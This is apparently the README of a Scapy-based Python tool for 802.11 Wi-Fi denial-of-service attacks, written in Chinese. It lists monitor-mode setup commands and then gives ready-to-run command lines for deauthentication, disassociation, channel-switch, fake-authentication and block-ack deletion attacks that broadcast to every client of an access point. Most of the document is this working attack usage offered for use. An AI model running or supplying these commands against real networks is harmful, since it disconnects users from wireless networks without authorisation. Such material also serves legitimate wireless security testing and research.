# scapy 802.11 dos攻击

## 前提条件
#### 你需要有一块无线网卡并可以置于monitor模式并切换到相应信道,假设interface是wlan0,ap位于信道1：
    iw dev wlan0 set type monitor (如果报错 先down掉: ip link set wlan0 down)
    
    iw dev wlan0 set channel 1 (如果之前down了网卡需要up起来：ip link set wlan up (如果rfkill报错 执行:rfkill unblock 0 (0是rfkill list 对应物理网卡的编号)))
   
#### 安装sacpy     
    pip3 install scapy
    
    
###  目前实现：
    deauthentication 解认证攻击 可以广播，不能攻击开启了管理帧保护的ap
    
    disassociation   解连接 可以广播，不能攻击开启了管理帧保护的ap
    
    csa(channel switch announcement) 信道切换攻击
    
    fake_auth 假认证攻击    
    
  
    

## example
#### deauthentication attack
    ./dos11.py deauth --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0
#### disassociation attack
    ./dos11.py disas  --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0
#### channel switch announcement
    ./dos11.py csa --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0 --switch-channel 1 --cap 65535
#### fake auth 
    ./dos11.py fake_auth --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0 --auth-algorithm 1 --interval 0
#### delete block ack (maybe not work)
    ./dos11.py delba --client-mac   FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0


    

    
    

    
 